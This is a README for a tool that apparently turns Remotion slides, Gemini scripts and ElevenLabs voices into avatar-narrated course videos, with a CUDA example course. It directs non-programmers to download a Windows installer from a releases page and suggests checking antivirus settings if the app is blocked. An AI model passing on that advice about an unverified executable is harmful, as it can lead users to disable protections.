# 🎥 cuda-course-remotion - Create AI Narrated Course Videos Easily

[![Download cuda-course-remotion](https://img.shields.io/badge/Download-Get%20App-orange)](https://github.com/CelexK/cuda-course-remotion/releases)

---

## About 📚

cuda-course-remotion helps you make narrated course videos with an AI avatar on top. It automatically builds animated slideshows using Remotion, creates speech scripts with Gemini, and produces voice audio using ElevenLabs TTS. Finally, it combines these elements with a talking-head avatar into one video.

This tool includes a full example course, called **CUDA Mastery**. It has 10 modules. Each module is a 10-minute video with animated slides, narration, and an AI presenter.



## 🚀 Getting Started

This guide shows how to download and run cuda-course-remotion on a Windows PC. You won’t need any programming skills.

### What you need before you start

- Windows 10 or 11 computer  
- Internet connection  
- Around 5 GB free disk space  
- At least 8 GB RAM (16 GB recommended for better performance)  
- Basic mouse and keyboard skills  

---

## 🎯 How cuda-course-remotion works

The software follows this process to create each course video:

1. **Create animated slides** using Remotion  
2. **Generate a speech script** from slides' content using Gemini  
3. **Convert text to speech** with ElevenLabs TTS  
4. **Create an AI avatar video** that reads the script  
5. **Combine all parts** into one final video  

---

## 🔽 Download and Install

1. Go to the release page here:  
   [Download cuda-course-remotion](https://github.com/CelexK/cuda-course-remotion/releases)  
   This link will take you to a page with the latest releases.

2. On the releases page, find the newest version.  
   Look for a Windows installer file, usually named like `cuda-course-remotion-setup.exe`.

3. Click the file to download it.

4. When the download finishes, open the file.

5. Follow the on-screen setup instructions. Generally, this means:  
   - Accept the license agreement (if shown)  
   - Choose where to install (use default if unsure)  
   - Click “Install”

6. Wait for the installation to complete.

7. Click “Finish” to close the installer.

---

## ▶️ Run the Application

Once installed, you can start cuda-course-remotion:

1. Click the Windows Start button.

2. Find “cuda-course-remotion” in the program list.

3. Click it to open.

The main window will show the **CUDA Mastery** course with 10 modules ready to create videos.

---

## 🛠 How to Use cuda-course-remotion

### Selecting a course module

- In the app window, select a module from the list on the left.  
- The right side shows the current video’s preview and details.

### Creating your video

- Press the **Generate Video** button.  
- The software will:  
  - Build slides animated with Remotion.  
  - Use Gemini to write the narration script.  
  - Use ElevenLabs to produce the voice audio.  
  - Generate the AI avatar video.  
  - Combine all elements into a final video file.

### Watching your video

- When complete, the app shows a **Play Video** button.
- Click to watch your narrated course video.

### Saving your video

- The video saves automatically in the app folder under `output/videos`.  
- You can find and copy it from there.

---

## 📂 File and Folder Structure Overview

Understanding the main files helps if you want to explore or modify content.

- `src/courses/cuda-mastery/`  
  Contains course modules. Each `.tsx` file is a module with scripts and slides.

- `src/courses/cuda-mastery/scenes/`  
  Holds individual slide components like title slides and content slides.

- `src/components/`  
  Contains reusable UI parts such as layouts and code blocks.

- `pipeline/`  
  Python scripts that run the AI pipeline steps:  
  - `generate_speech.py` turns slides into speech scripts.  
  - `generate_audio.py` creates audio and merges video.  
  - `generate_avatars.py` makes talking-head videos.

---

## ⚙️ System Requirements

- Windows 10 or 11 (64-bit)  
- 8 GB RAM minimum, 16 GB preferred  
- 5 GB free disk space  
- Internet access for AI features  
- Compatible graphics card recommended for smooth rendering

---

## 🔧 Troubleshooting Tips

- If the app won’t start, check your antivirus or firewall settings. It may block some files.  
- If video generation fails, try closing other programs to free memory.  
- Make sure you have an active internet connection. AI services require it.  
- Restart the app if it becomes unresponsive.  
- Check the `output/logs` folder for detailed error messages.

---

## ❓ FAQ

**Q: Do I need programming skills to use this?**  
No. The app is designed for users without coding experience.

**Q: Can I make my own courses?**  
Yes. You can add your own slides and scripts by editing files under `src/courses`.

**Q: How long does video creation take?**  
About 15-20 minutes per 10-minute video, depending on your system.

**Q: Can I share the videos?**  
Yes. The final videos are saved as standard MP4 files.

---

## 🆘 Support

For help or to report issues, use the GitHub repository’s Issues tab. Include detailed information about your problem and your system setup.

---

[![Download cuda-course-remotion](https://img.shields.io/badge/Download-Get%20App-orange)](https://github.com/CelexK/cuda-course-remotion/releases)